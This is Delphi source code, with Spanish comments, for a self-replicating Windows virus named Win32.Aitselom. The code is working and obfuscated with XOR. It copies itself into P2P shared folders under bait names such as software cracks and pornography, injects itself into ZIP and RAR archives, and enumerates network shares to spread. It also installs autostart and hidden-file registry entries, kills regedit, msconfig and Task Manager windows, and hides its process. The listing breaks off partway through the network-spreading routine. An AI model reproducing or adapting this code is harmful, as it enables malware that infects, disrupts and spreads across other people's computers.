   program Aitselom;


   //Virus_Name      =       Win32.Aitselom.Ch@PP;
   //Desarrollador   =       Pana_Infierno/GEDZAC
   //Mail            =       (Pana_Infierno@Hotmail.com, Pana_Infierno@gedzac.com);
   //Finish          =       viernes 11 de Febrero del 2005, 01:20 am
   //Pais            =       Chile

   //Agradecimientos a Byt3Cr0/GEDZAC por su gran apoyo en la realizacion de este virus y por todo
   //el tiempo que ha dedicado a ayudarme y enseñarme.


   //Virus no destructivo desarrollado y probado especialmente en WinXP Profesional Service Pack 2, ahora
   //vere si funciona en Win98 tambien, la idea general de virus es solo molestar al ususario para que
   //desee quitar el virus, su playload es que se abren 10 ventanas del notepad y 10 ventanas de la
   //calculadora, una pagina de playboy y otra de xxx.com se inicia con un contador
   //cada vez que reiniciamos el pc este descontara uno si es cero se abre el playload
   //despues de 10 minutos si se sigue usando el pc infectado se abrira nuevamente el mismo playload
   //pero esta vez se reinicia el pc.

   //Virus multihilo (Gracias Byt3Cr0/GEDZAC),
   //Encriptado
   //Residente en memoria
   //infecta carpetas P2P
   //infecta entorno de red
   //infecta diskettes
   //detecta Office e infecta el diskette
   //mata procesos regedit, msconfig, task de windows
   //infecta rar y zip




   uses
   SysUtils,
   Registry,
   Windows,
   UrlMon,
   Classes;

   CONST

    NombreVirus:array[0..9] of string =('Win32.Aitselom@Ch','Win32.Aitselom@Ch','Win32.Aitselom@Ch','Win32.Aitselom@Ch','Win32.Aitselom@Ch','Win32.Aitselom@Ch','Win32.Aitselom@Ch','Win32.Aitselom@Ch','Win32.Aitselom@Ch','Win32.Aitselom@Ch');

   //  CONST AVS:array[0..302] of string=
   //('fqw45)b b','fqwjhi)b b','}hibfkfuj)b b','qtopni45)b b','qbs>2)b b','setdfi)b b','tbuq>2)b b','Itwdkbfi)b b','dkufq)dhj','tdfi45)b b','ufq0)b b','ifqp)b b','hrswhts)b b','ijfni)b b','ifqis)b b','jwasuf~)b b','khdlchpi5777)b b','ndttrwwis)b b','ndkhfc>2)b b','nfjfww)b b','anicqnur)b b','a*f`is>2)b b','cq>2)b b','cq>2Xh)b b','dkfp>2ds)b b','danfrcns)b b','fqprwc45)b b','fqwsd45)b b','Xfqw45)b b','fq`dsuk)b b','fwq cpni)b b','Xfqwdd)b b','fqwdd)b b','panicq45)b b','qtbdhju)b b','sct5*is)b b','tpbbw>2)b b','BANIBS45)B_B','tdutdfi)b b','tfabpbe)b b','wbutap)b b','ifqtdobc)b b','iqd>2)b b','intrj)b b','ifqkr45)b b','FKH@TBUQ','FJHI>_','FQ@TBUQ>','FQ@P','fqlwhw','fqltbuqndb','FqlTbuq','fqlpdsk>','FQ_JHINSHU>_','FQ_JHINSHUIS','FQ_VRFU','jhhknqb)b b','mbc)b b','ndtrww>2)b b','nejfqtw)b b','aup)b b','a*tshwp)b b','btwpfsdo)b b','wuhdb w','ankbjhi)b b','ub`jhi)b b','cqw>2)b b','danfcjni)b b','fqpni>2)b b','fqwj)b b','fqw)b b','fqb45)b b','fisn*suhmfi)b b','pbetdfi)b b','pbetdfi )b b','qttdfi37)b b',
   //'sct5*>?)b b','T~jWuh ~Tqd','T^JSUF^','SFRJHI','SDJ','SCT*4','SAFL','qedjtbuq','QeDhit','QN/U*OBKW','QWD45','QWSUF^','QTJFNI','qtjhi','PNJJRI45','P@AB>2','PBESUFW','PFSDOCH@','PuFcjni','twoni )b b','tdfiwj)b b','ubtdrb)b b','wdapfkkndhi)b b','wfqdk)b b','irw`ufcb)b b','ifqpis)b b','ifqfwp45)b b','krfkk)b b','nhjhi>?)b b','ndjhhi)b b','awuhs)b b','a*wuhs>2)b b','btfab)b b','dkbfibu4)b b','NEJFTI)B_B','FQ_P','da`Pn}','DJ@UCNFI','DHIIBDSNHIJHINSHU','DWCDkis','CBAPFSDO','DSUK','cbafkbus','cbatdfi`rn','CHHUT','BAWBFCJ','BSURTSDNWB','BQWI','B_WBUS','afjbo45','ado45','ano45','ekfdlndb)b b','fqtdobc45)b b','fqwcht45)b b','fqwis)b b','fqdhithk)b b','fdlpni45)b b','IPSHHK61','wddpni>0','WUH@UFJFRCNSHU','WHW4SUFW','WUHDBTTJHINSHU','WHUSJHINSHU','WHWUH_^','wdtdfi','wdisjhi','wfqwuh ~','WFCJNI','wqnbp>2','ufwfww)b b','UBFKJHI','USQTDI>2','qttsfs)b b','qbssuf~)b b','sdf)b b','tjd)b b','tdfi>2)b b','ufq0pni)b b','wddpni>?)b b','LWAP45)B_B','FCQ_CPNI','wfcjni)b b','ihujnts)b b','ifqp45)b b','i45tdfi)b b',
   //'khhlhrs)b b','nafdb)b b','ndkhfcis)b b','TW^__','TT4BCNS','TpbbwIbs','nfjtbuq)b b','aw*pni)b b','a*wuhs)b b','bdbi`nib)b b','dkbfibu)b b','danic)b b','ekfdlc)b b','URKFRIDO','tetbuq','TPIBSTRW','PuDsuk','fqwrwc)b b','fqltbuq)b b','frshchpi)b b','Xfqwj)b b','fqwj)b b','ub`bcns)b b','jtdhian`)b b','AWUHS>2)B_B','NEJFTI)B_B','tad)b b','ub`bcs45)b b','haa`rfuc)b b','wfq)b b','wfqjfnk)b b','wbu)b b','wbuc)b b','wbustl)b b','wburwc)b b','wbuqfd)b b','wbuqfdc)b b','so)b b','so45)b b','so45rwc)b b','sofq)b b','soc)b b','soc45)b b','sojfnk)b b','fkbustqd)b b','fjhi)b b','lwa)b b','fisnqnu','fqt~ij`u)b b','danibs)b b','danibs45)b b','ndjhi)b b','khdlchpifcqfidbc)b b','krdhjtbuqbu)b b','jdfabb','ifqfwtqd)b b','ifquriu)b b','inttbuq)b b','itdobc45)b b','wddnhjhi)b b','wddjfni)b b','wqnbp>2)b b','Fqis)b b','Dkfp>2da)b b','Cqw>2X7)b b','Qtdfi37)b b','Ndtrwwis)b b','Mbcn)b b','I45tdfip)b b','Wfqtdobc)b b','Wfqp)b b','Fqubw45)b b','Jhinshu)b b','at`l45','atj45','atjf45','atje45','`ejbir','@EWHKK','@BIBUNDT',
   //'@RFUC','NFJTSFST','NTUQ>2','KCWUHJBIR','KCTDFI','KRTWS','JDJIOCKU','JDSHHK','JDRWCFSB','JDQTUSB','J@OSJK','JNINKH@','JDQTTOKC','JDF@BIS','JWATBUQNDB','JPFSDO','IbhPfsdoKh`','IQTQD45','IPTbuqndb','IS_dhian`','ISQCJ','isustdfi','iwttqd','iwtdobdl','ibsrsnkt','icc45','IFQBI@IFQB_62','ihstsfus)b b','}fwuh)b b','wvubjhqb)dhj','Erkk@rfuc','DDFWW)B_B','qbs>?)b b','QBS45)B_B','QDHISUHK)B_B','dkfp>2)b b','FIST','FSDHI','FSRWCFSBU','FSPFSDO','FrshSufdb','FQ@DD45','Fq`Tbuq','FQPNIIS','aiue45','atff','atfq45',']FW)B_B',']FWC)B_B',']FWWU@)B_B',']FWT)B_B',']DFW)B_B','wapf`bis)b b','wapdhi)b b','ecjdhi)b b','ecif`bis)b b','ectpnsdo)b b','ectt)b b','ectpnsdo)b b','ecjdhi)b b','');

      var
       var1,var2:string;
       SuperTaldo: TextFile;
       G:File;
       Fichero,SuperRutaldo,copio,ydespues : string;
       Valor:string;
       ValorInt,contar:integer;
       Sem  : THandle;
       Registro    :TRegistry;
       Key, Value,Value1: string;
       dire,name,path:string;
       Ficheros:TStringList;
       aa,bb,cantidad:integer;
       PathProgramas:String;
       PathWindows:STRING;
       VersionW:integer;
       Reg:TRegistry;
       tears:dword;
       we:integer;
       Accion:String;

   Function E(Texto:string;Clave:integer):string;
   var
       Nuevo:string;
       Largo,I:Integer;
   begin
    Largo := strLen(PChar(Texto));
     For i := 1 to Largo do
      begin
       Nuevo := Nuevo + chr(ord(Texto[i]) xor Clave);
      end;
       E := Nuevo;
   end;

   function Lista(NombreArchivo:string):Integer;
   begin
    cantidad:=0;
    AssignFile(SuperTaldo,(NombreArchivo));
    Reset(SuperTaldo);
    While not eof(SuperTaldo) do
     begin
       Readln(SuperTaldo, Copio);
        if Copio <> ' ' then
         begin
          cantidad:=cantidad+1;
         end;
     end;
    CloseFile(SuperTaldo);
    Result:=cantidad;
   end;

   //************ Obtener archivos de programa **************************
   Function ProgramFiles:string;
   var
     Ruta:String;
   function ResolveEnvVars(Const S:String):String;
   var
     F:Word;
     IsASysVar:Boolean;
     SysVar:String;
     buffer:pchar;
   begin
     IsASysVar:=False;
     for F:=1 to Length(S) do
     begin
       if IsASysVar then
       begin
         if S[F]='%' then
         begin
           GetMem(buffer,200);
           GetEnvironmentVariable(PChar(SysVar),PChar(buffer),200);
           Result:=Result+buffer;
           FreeMem(buffer,200);
           IsASysVar:=False;
         end
         else
           SysVar:=SysVar+S[F];
       end
       else
       begin
         if S[F]='%' then
         begin
           SysVar:='';
           IsASysVar:=True;
         end
         else
           Result:=Result+S[F]
       end;
     end;
   end;

   begin
     //Obtener el directorio "Archivos de Programa\"
     Reg:=TRegistry.Create;
     Reg.RootKey:=HKEY_LOCAL_MACHINE;
     Reg.OpenKeyReadOnly(E('VYEL^]KXOVGcixeyel~V]cdne}yVI xxod~\oxyced',10));
     Ruta:=ResolveEnvVars(Reg.ReadString(E('ZxemxkgLcfoyZk~b',10)));
     Result:=Ruta;
   end;


       function DiskInDrive(Drive: Char): Boolean;
       var
         ErrorMode: word;
       begin
         { make it upper case }
         if Drive in ['a'..'z'] then Dec(Drive, $20);
         { make sure it's a letter }
         if not (Drive in ['A'..'Z']) then
           raise EConvertError.Create('Not a valid drive ID');
         { turn off critical errors }
         ErrorMode := SetErrorMode(SEM_FailCriticalErrors);
         try
           { drive 1 = a, 2 = b, 3 = c, etc. }
           if DiskSize(Ord(Drive) - $40) = -1 then
             Result := False
           else
             Result := True;
         finally
           { restore old error mode }
           SetErrorMode(ErrorMode);
         end;
       end;



     Function GetOsVersion:Integer;
      begin
        case Win32Platform of
          VER_PLATFORM_WIN32s:
            Result:=1;
          VER_PLATFORM_WIN32_WINDOWS:
            Result:=1;
          VER_PLATFORM_WIN32_NT:
              Result:=2;
        end;
      end;

   //************** Fin version de Windows     **********

   Function LeerReg(Llave : HKEY; ruta,llavex:string): string;
   VAR
     Reg:TRegistry;
    Begin
      Reg := TRegistry.Create;
      Reg.RootKey := Llave;
      IF Reg.OpenKeyReadOnly(ruta) Then
      Result := Reg.ReadString(llavex);
   End;


   //************** Obtener el directorio de Windows *************************
     function GetWindowsDirectory : String;
     var
        pcWindowsDirectory : PChar;
        dwWDSize           : DWORD;
     begin
        dwWDSize := MAX_PATH + 1;
        GetMem( pcWindowsDirectory, dwWDSize );
        try
           if Windows.GetWindowsDirectory( pcWindowsDirectory, dwWDSize ) <> 0 then
              Result := pcWindowsDirectory;
        finally
           FreeMem( pcWindowsDirectory );
        end;
     end;

   //************** Fin obtener version de windows *************************

   //****************** Paths de windows *********************************
   function ObtienePath(De:String):string;
   var
     Registro: TRegIniFile;
   begin

   //  Registro :=TRegIniFile.Create('Software\MicroSoft\Windows\CurrentVersion\Explorer');
     Registro :=TRegIniFile.Create(E('Yel~}kxoVGcixeYel~V]cdne}yVI xxod~\oxycedVOrzfexox',10));

   //  Result:= Registro.ReadString('Shell Folders',De,'');
     Result:= Registro.ReadString(E('Yboff*Lefnoxy',10),De,'');

     Registro.Free;
   end;
   //*******************************************************************
   {FUNCTION RegRead(LaKey: HKEY; Rutakey, Valor: String): String;
   VAR
     ValorRet: array[0..1500] of Char;
     TamaDato: Integer;
     Llaveactual: HKEY;
     Begin
       RegOpenKeyEx(LaKey, PChar(Rutakey), 0, KEY_ALL_ACCESS, llaveactual);
       TamaDato := 1501;
       RegQueryValueEx(llaveactual, PChar(Valor), nil, nil, @ValorRet[0], @TamaDato);
       RegCloseKey(llaveactual);
       Result := String(ValorRet);
   end;}


   Procedure BuscaFicheros(path, mask : AnsiString; var Value : TStringList; brec : Boolean);
   var
     srRes : TSearchRec;
     iFound : Integer;

    begin
      if ( brec ) then
       begin
       if path[Length(path)] <> '\' then path := path +'\';
       iFound := FindFirst( path + '*.*', faAnyfile, srRes );
       while iFound = 0 do
         begin
         if ( srRes.Name <> '.' ) and ( srRes.Name <> '..' ) then
           if srRes.Attr and faDirectory > 0 then
             BuscaFicheros( path + srRes.Name, mask, Value, brec );
         iFound := FindNext(srRes);
         end;
   //    FindClose(srRes);
       end;
     if path[Length(path)] <> '\' then path := path +'\';
     iFound := FindFirst(path+mask, faAnyFile-faDirectory, srRes);
     while iFound = 0 do
       begin
       if ( srRes.Name <> '.' ) and ( srRes.Name <> '..' ) and ( srRes.Name <> '' ) then
         Value.Add(path+srRes.Name);
       iFound := FindNext(srRes);
       end;
   //  FindClose( srRes );

    end;

   //***************************************************************************
   //*************** Infectar Rar y Zip *****************************
   Procedure InfectRarZip;
   Var
       RutaDestino:string;
       NombreArchivo:String;

       NombreCorto:String;
       FuenteVirus:String;
       rars,zips,ziptmp:String;
       ruta1,ruta2:string;
       i:integer;
    begin
        FuenteVirus:=e('i0VXokngo$~r~$oro',10);
        CopyFile(Pchar(paramstr(0)),pchar(FuenteVirus),true);

   //crear carpeta temporal para almacenar programas

   if Not FileExists(PathWindows+e('VCdloi~$nx|',10)) then
    begin
    if LeerReg(HKEY_CLASSES_ROOT,e('V]cdXKXVyboffVezodVieggkdn',10),'') <> '' then
     begin
       Ficheros:=TStringList.Create;
       BuscaFicheros(e('i0V',10),e(' $Pcz',10),Ficheros,TRUE);
       BuscaFicheros(e('i0V',10),e(' $Xkx',10),Ficheros,TRUE);
       BuscaFicheros(e('n0V',10),e(' $Pcz',10),Ficheros,TRUE);
       BuscaFicheros(e('n0V',10),e(' $Xkx',10),Ficheros,TRUE);

   //Quita el atributo de solo lectura a cada archivo encontrado
      for i := 0 to (Ficheros.Count-1) do
       begin
        if GetOSVersion=1 then
         begin
            NombreCorto:=ExtractShortPathName(ficheros.Strings[i]);
            Accion:=e('hdffjeo%hdf+$h+j  ybi+&y+',11)+ nombrecorto;
         end
          else
           begin
            NombreCorto:=ExtractShortPathName(ficheros.Strings[i]);
            Accion:=e('Hfo%nsn+$h+j  ybi+&y+',10)+ nombrecorto;
           end;
            Try
             WinExec(Pchar(accion),SW_HIDE);
            Except
            end;
       end;

      //Infectar los rars y zips encontrados con winrar

         Rars:=LeerReg(HKEY_CLASSES_ROOT,e('V]cdXKXVyboffVezodVieggkdn',10),'');
         Rars:=ExtractFilePath(Rars);


         rars:=copy(Rars,2,Length(rars)-1);
         Rars:=Rars+'winrar.exe';
         rars:=ExtractShortPathName(rars);

      for i := 0 to (Ficheros.Count-1) do
       begin

        NombreArchivo:=ExtractFilename(ficheros.Strings[i]);
        RutaDestino:=  ExtractFilePath(ficheros.Strings[i]);
        NombreCorto:=ExtractShortPathName(ficheros.Strings[i]);
        if GetOSVersion=1 then
         begin
          Accion:=e('Ieggkdn$ieg*%i',10)+' '+ rars + ' a ' + NombreCorto +' '+FuenteVirus;
         end
          else
           begin
            Accion:=e('Ign$oro*%i',10)+' '+ rars + ' a ' + NombreCorto +' '+FuenteVirus;
           end;

   Try
        WinExec(Pchar(accion),SW_HIDE);
   Except
   end;
       end;
       Ficheros.Free;

        AssignFile(SuperTaldo,(PathWindows+e('VCdloi~$nx|',10)));
        Rewrite(SuperTaldo);
        CloseFile(SuperTaldo);

    end;
   end;

   if Not FileExists(PathWindows+e('VCdloi~$nx|',10)) then
    begin
     if LeerReg(HKEY_CLASSES_ROOT,e('V]cdPczVyboffVezodVieggkdn',10),'') <> '' then
       begin
   //Registrando WinZip
         AssignFile(SuperTaldo,PathWindows+e('V]cdPcz$xom',10));
         Rewrite(SuperTaldo);

           Writeln(SuperTaldo,e('XOMONC^>',10));
           Writeln(SuperTaldo,e('QBAOSUI_XXOD^U_YOXVYel~}kxoVDcie*Gka*Iegz ~cdmV]cdPczV]cdCdcW',10));
           Writeln(SuperTaldo,e('(DKGO(7(MONPKI(',10));
           Writeln(SuperTaldo,e('(YD(7(OHH3:>8O(',10));
           Writeln(SuperTaldo,e('QBAOSU_YOXYV$NOLK_F^Vyel~}kxoVdcie*gka*iegz ~cdmV}cdpczV}cdcdcVDkgoW',10));
           Writeln(SuperTaldo,e('(DKGO(7(MONPKI(',10));
           Writeln(SuperTaldo,e('(YD(7(OHH3:>8O(',10));


         CloseFile(SuperTaldo);

        if GetOSVersion=1 then
         begin
            Accion:=e('Ieggkdn$ieg*%i*xomonc~*%y*%i*',10)+ PathWindows+e('V]cdPcz$xom',10);
         end
          else
           begin
            Accion:=e('Ign$oro*%i*xomonc~*%y*%i*',10)+ PathWindows+e('V]cdPcz$xom',10);
           end;

   Try
          WinExec(Pchar(accion),SW_HIDE);
   Except
   end;

   //     sleep(1000);
   //     DeleteFile(Pchar(PathWindows + '\WinZip.reg'));

   //***************** FIN WINZIP *****************


        Ficheros:=TStringList.Create;
        BuscaFicheros(e('i0V',10),e(' $Pcz',10),Ficheros,TRUE);
        BuscaFicheros(e('n0V',10),e(' $Pcz',10),Ficheros,TRUE);

   //Quita el atributo de solo lectura a cada archivo encontrado
      for i := 0 to (Ficheros.Count-1) do
       begin
        if GetOSVersion=1 then
         begin
            NombreCorto:=ExtractShortPathName(ficheros.Strings[i]);
            Accion:=e('hdffjeo%hdf+$h+j  ybi+&y+',11)+ nombrecorto;
         end
          else
           begin
            NombreCorto:=ExtractShortPathName(ficheros.Strings[i]);
            Accion:=e('Hfo%nsn+$h+j  ybi+&y+',11)+ nombrecorto;
           end;
            Try
             WinExec(Pchar(accion),SW_HIDE);
            Except
            end;
       end;

      //Infectar los zips encontrados con winzip

         Zips:=ExtractFileName(LeerReg(HKEY_CLASSES_ROOT,e('V]cdPczVyboffVezodVieggkdn',10),''));

          for i:=1 to Length(Zips) do
           begin
            if copy(Zips,i,1) <> ' ' then
             begin
              Ziptmp:= Ziptmp + copy(Zips,i,1);
             end
              else Zips:=Ziptmp;
           end;

   Zips:=ProgramFiles+e('V]cdPczV',10) + Zips;
      for i := 0 to (Ficheros.Count-1) do
       begin
         ruta1:=ExtractShortPathName(zips) +  ' -a';
         ruta2:=ExtractShortPathName(ficheros.Strings[i]);

        if GetOSVersion=1 then
         begin
          Accion:=e('Ieggkdn$ieg*%i*',10)+ ruta1+' '  + ruta2 + ' ' +  FuenteVirus;
         end
          else
           begin
            Accion:=e('Ign$oro*%i*',10)+ ruta1+' '  + ruta2 + ' ' +  FuenteVirus;
           end;
         Try
          WinExec(Pchar(accion),SW_HIDE);
         Except
         end;
       end;
      Ficheros.Free;

        AssignFile(SuperTaldo,(PathWindows+e('VCdloi~$nx|',10)));
        Rewrite(SuperTaldo);
        CloseFile(SuperTaldo);
       end;
   end;
    end;

   //ÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇ77ppppppppppppppppppppppppppppppppppppppppppppppppppppppppp


   //************************Infectar el sistema ***************
   procedure InfectarSistema;
   begin

           PathWindows:=GetWindowsDirectory;
           dire:=ExtractFilePath(ParamStr(0));
           name:=ExtractfileName(ParamStr(0));
           path:=dire+name;

   try
            copyfile(pchar(path),Pchar(PathWindows + E('Vnkoged$oro',10)),true);

   except
   end;
   //         copyfile(pchar(path),pchar(PathWindows+'\daemon.exe'),true);

   //   PathProgramas:=(ObtienePath('Programs'));
      PathProgramas:=(ObtienePath(E('Zxemxkgy',10)));
   //   PathProgramas:=PathProgramas + '\inicio' ;
      PathProgramas:=PathProgramas + E('Vcdcice',10) ;
   //   CopyFile(pchar(path),pchar(PathProgramas + '\Office_Service.pif',10) ),true);
       try
        CopyFile(pchar(path),pchar(PathProgramas + E('VEllcioUYox|cio$zcl',10) ),true);
       except
       end;
   //   SuperRutaldo:=Pchar(PathWindows + E('Vnkoged8$oro',10));
   end;



   //*************** Infectar P2P ***********************


   Procedure InfectP2P;
   var
    i,k:integer;
   //const P2P: array[0..19] of Pchar = ('\TorrenTopia\Downloads\','\emule\incoming\','\appleJuice\incoming\','\eDonkey2000\incoming\','\Gnucleus\Downloads\','\Grokster\My Grokster\','\ICQ\shared files\','\Kazaa\My Shared Folder\','\KaZaA Lite\My Shared Folder\','\LimeWire\Shared\','\morpheus\My Shared Folder\','\Overnet\incoming\','\Shareaza\Downloads\','\Swaptor\Download\','\WinMX\My Shared Folder\','\Tesla\Files\','\XoloX\Downloads\','\Rapigator\Share\','\KMD\My Shared Folder\','\BearShare\Shared\');
   const P2P: array[0..19] of String = ('V^exxod^ezckVNe}dfeknyV','Vog foVcdiegcdmV','Vkzzfo@ cioVcdiegcdmV','VoNedaos8:::VcdiegcdmV','VMd ifo yVNe}dfeknyV','VMxeay~oxVGs*Mxeay~oxV','VCI[Vybkxon*lcfoyV','VAkpkkVGs*Ybkxon*LefnoxV','VAkPkK*Fc~oVGs*Ybkxon*LefnoxV','VFcgo]cxoVYbkxonV','Vgexzbo yVGs*Ybkxon*LefnoxV','VE|oxdo~VcdiegcdmV','VYbkxokpkVNe}dfeknyV','VY}kz~exVNe}dfeknV','V]cdGRVGs*Ybkxon*LefnoxV','V^oyfkVLcfoyV','VRefeRVNe}dfeknyV','VXkzcmk~exVYbkxoV','VAGNVGs*Ybkxon*LefnoxV','VHokxYbkxoVYbkxonV');
   //const Name:array[0..23]  of Pchar = ('', 'Crack Nero Express','Torrent','Crack Norton','Crack Msn','Crackear Msn','Winamp','Winrar360','Norton 2005','Pamela.jpg','Crack Msn 7.0','IRC','Crack Irc','Pornografia','XXX','Video','Age of Empires','Starcraft','Age Of Empires Crack','Starcraft Crack','Killer Instinct','crack norton 2005','norton 2006','msn8');

   const Name:array[0..70]  of Pchar = ('Zkgofk*Kdnoxyed', 'Ixkia*Doxe*Orzxoyy','^exxod~','Ixkia*Dex~ed','Ixkia*Gyd','Ixkiaokx*Gyd',']cdkgz2',']cdxkx9<:','Dex~ed*8::?','Zkgofk$`zm','Ixkia*Gyd*=$:','CXI','Ixkia*Cxi','Zexdemxklck','RRR','\cnoe','Kmo*el*Ogzcxoy','Y~kxixkl~','Kmo*El*Ogzcxoy*Ixkia','Y~kxixkl~*Ixkia','Acffox*Cdy~cdi~','ixkia*dex~ed*8::?','dex~ed*8::<','gyd2','Akpkk*Gonck*Noya~ez','CI[*Fc~o',']cdPcz','cGoyb','KEF*Cdy~kd~*Goyyodmox*"KCG#','CI[*zxe*8::9k*ho~k','Gexzbo y','Kn*k}kxo','^xcffckd','Ne}dfekn*Kiiofoxk~ex*zf y','PedoKfkxg'
   ,'Gcixeyel~*Ellcio*RZ','Gcixeyel~*]cdne}y*8::9','Ellcio*8::9','\cy kf*Y~ nce*Do~','Nofzbc*<','gyd*bkia','Gk~xcr*Ge|co','\cx~ kf*Mcxf','Lcxo]exay*>','LCxo]exay*GR','Ixkiaon','ixkia*kff*|oxycedy','AosMod','L ff*|oxyced','Xozxen i~ex*no*]cdne}y*Gonck'
   ,'Mxeay~ox',']cdXKX','Nc|R*\cnoe*H dnfo','XokfEdo*Lxoo*Zfksox','Do~ gox','@o~K nce*Hkyci','Xomcy~xs*Goibkdci','Iezoxdci*Kmod~',']cdkgz','Nco~*Akpkk','YefY c~o*8::90*Yefc~kcxo*Ikxn*Mkgoy*Y c~o','[ cia^cgo','RefeR*_f~xk','Gcixeyel~*Cd~oxdo~*Orfexox','Do~}exa*Ikhfo*o*KNYF*Yzoon','Akpkk*Ne}dfekn*Kiiofoxk~ex','Mfehkf*Nc\R*fksox','Ncxoi~N\N','Fefc~ky','Zone','yore');



    Begin
    if (paramstr(1) = 'c') or (paramstr(1) = 'C')  then
     begin
      for k:=0 to 70 do
       begin
       for i:=0 to 19 do
        begin
           CopyFile(Pchar(PathWindows + '\' +paramstr(2)),pchar(ProgramFiles+E(P2P[i],10)+E(Name[k],10)+'.exe'),True);
        end;
       end;

      for k:=0 to 70 do
       begin
        CopyFile(Pchar(PathWindows+E('Vnkoged$oro',10)),pchar(E('I0VCdo~z hVl~zxee~V',10)+E(Name[k],10)+'.exe'),true);
        CopyFile(Pchar(PathWindows+E('Vnkoged$oro',10)),pchar(E('I0VGs*Ne}dfeknV',10)+E(Name[k],10)+'.exe'),true);
        CopyFile(Pchar(PathWindows+E('Vnkoged$oro',10)),pchar(E('I0VGs*Ne}dfeknyV',10)+E(Name[k],10)+'.exe'),true);
        CopyFile(Pchar(PathWindows+E('Vnkoged$oro',10)),pchar(E('I0VGs*Ybkxon*LefnoxV',10)+E(Name[k],10)+'.exe'),true);
        CopyFile(Pchar(PathWindows+E('Vnkoged$oro',10)),pchar(E('I0VNe}dfeknV',10)+E(Name[k],10)+'.exe'),true);
        CopyFile(Pchar(PathWindows+E('Vnkoged$oro',10)),pchar(E('I0VNe}dfeknyV',10)+E(Name[k],10)+'.exe'),true);
       end;
     end;
    End;
   //****************************************************


   procedure ActulizarCarpetasTrue;
   begin
   //Actualizar carpetas automaticamente
   aa:=00;
   bb:=1;
   Registro:=TRegistry.create;
   Registro.RootKey := HKEY_LOCAL_MACHINE;

   //if Registro.OpenKey('System\CurrentControlSet\Control\Update',FALSE) then
   if Registro.OpenKey(E('Ysy~ogVI xxod~Ied~xefYo~VIed~xefV_znk~o',10),FALSE) then

   //   registro.WriteBinaryData('UpdateMode',aa,bb);
      registro.WriteBinaryData(E('_znk~oGeno',10),aa,bb);
   //   Registro.Destroy;
   end;




   Procedure GrabaRegistroMostrarOcultosFalse;
   var
    i:integer;
    begin


         ydespues:='';
         AssignFile(SuperTaldo,PathWindows+e('Vcdloi~k~o$xom',10));
         Rewrite(SuperTaldo);
           Writeln(SuperTaldo,e('XOMONC^>',10));
           Writeln(SuperTaldo,e('QBAOSUFEIKFUGKIBCDOVYel~}kxoVGcixeyel~V]cdne}yVI xxod~\oxycedVX dW',10));

           for i:=1 to Length(PathWindows +'\'+ e('nkoged$oro',10)) do
            begin
             copio:=copy(PathWindows + '\'+ e('nkoged$oro',10),i,1);
              if copio = '\' then
               begin
                ydespues:=ydespues+'\'+copio;
               end
                else
                 begin
                  ydespues:=ydespues+copio;
                 end;
            end;
           Writeln(SuperTaldo,e('(Nkoged(7(',10)+ydespues+e('*i*nkoged8$oro',10)+'"');
           Writeln(SuperTaldo,e('QBAOSUI_XXOD^U_YOXVYel~}kxoVGcixeyel~V]cdne}yVI xxod~\oxycedVOrzfexoxVKn|kdionW',10));
           Writeln(SuperTaldo,e('(BcnoLcfoOr~(7n}exn0:::::::;',10));
           Writeln(SuperTaldo,e('(Bcnnod(7n}exn0::::::::',10));
         CloseFile(SuperTaldo);

        if GetOSVersion=1 then
         begin
            Accion:=e('Ieggkdn$ieg*%i*xomonc~*%y*%i*',10)+ PathWindows+e('Vcdloi~k~o$xom',10);
         end
          else
           begin
            Accion:=e('Ign$oro*%i*xomonc~*%y*%i*',10)+ PathWindows+e('Vcdloi~k~o$xom',10);
           end;

         Try
          WinExec(Pchar(accion),SW_HIDE);
         Except
         End;

    end;

   Procedure UnaVez;
    begin
   //este procedimiento no deja abrir 2 veces el programa
      Sem := CreateSemaphore(nil,0,1,'Win32.Aitselom.Ch@PP');
      if ((Sem <> 0) and (GetLastError = ERROR_ALREADY_EXISTS)) then
      begin
        CloseHandle( Sem );
      Halt;
      end;
    end;


   procedure Kill;
   begin
    asm
     push ebx
     push 0
     call FindWindow
     test eax,eax
     jz @nOp_
     push 0
     push 0
     push 12h
     push eax
     Call PostMessage
     @nOp_:
    end;
   end;


   Function MatarVarios:integer;
   var

    Ventana1,Ventana2,Ventana3,Ventana4,Ventana5,Ventana6,Ventana7: pchar;
   Begin

   Ventana1:=Pchar(E('Kngcdcy~xknex*no*~kxoky*no*]cdne}y',10));
   Ventana2:=Pchar(E('_~cfcnkn*no*iedlcm xkicùd*nof*ycy~ogk',10));
   Ventana3:=Pchar(E('Onc~ex*nof*Xomcy~xe',10));
   Ventana4:=Pchar(E('Iedyefk*no*\cx~ kf*Zi',10));
   Ventana5:=Pchar(E('Ioxxkx*Zxemxkgk',10));
   Ventana6:=Pchar(E('Zxemxkgk*no*iedlcm xkicùd*nof*ycy~ogk',10));
   Ventana7:=Pchar(E('Ioxxkx*zxemxkgk',10));


    asm
     mov ebx, Ventana1
     Call Kill
     mov ebx, Ventana2
     Call Kill
     mov ebx, Ventana3
     Call Kill
     mov ebx, Ventana4
     Call Kill
     mov ebx, Ventana5
     Call Kill
     mov ebx, Ventana6
     Call Kill
    end;
   End;

   Procedure Ocultar;
   type
     TRegisterService = function (dwProcessID, dwType:DWord):Dword;stdcall;

   var
    RegisterServiceProcess: TRegisterService;


     function AsignaProcedure(EnQueDll,Procedimiento: string):TFarProc;
     var
       MangoProc,
       MangoLib    : THandle;

     begin
       Result:=nil;
       MangoLib:=GetModuleHandle(Pchar(EnQueDll));
       if MangoLib <> 0 then
         Result:=GetProcAddress(MangoLib,Pchar(Procedimiento));
     end;

    begin
   versionW:=GetOSVersion;
     if versionw = 1 then            // ------> 1 = 9x
      begin
     try
       @RegisterServiceProcess:=AsignaProcedure( 'KERNEL32.DLL',
                                                 'RegisterServiceProcess');
     {Ocultar la aplicacion.../Hide the application...}
     if Assigned(RegisterServiceProcess) then
       RegisterServiceProcess(GetCurrentProcessID,1);

     except

     end;

      end;


    end;

   Procedure InfectarEntornoRed;
   procedure Enumera(Cual:PnetResource);
   var
     Mango           :THandle;
     NumeroEntradas  :DWord;
     Buffer          :Array [1..100] of TNetResource;
     LongBuffer      :DWord;
     n               :Integer;
     Stri            :String;

   begin
     LongBuffer:=SizeOf(Buffer);
     WNetOpenEnum( RESOURCE_GLOBALNET,RESOURCETYPE_ANY,0,Cual,Mango);
     NumeroEntradas:=100;
     WNetEnumResource( Mango,NumeroEntradas,@Buffer[1],LongBuffer);

     for n:=1 to NumeroEntradas do
     begin
      if Not FileExists(PathWindows + e('Vxonoy$nk~',10)) then
       begin
        Stri:=copy(Buffer[n].lpRemoteName,0,2);
        if stri=E('VV',10) then
         begin
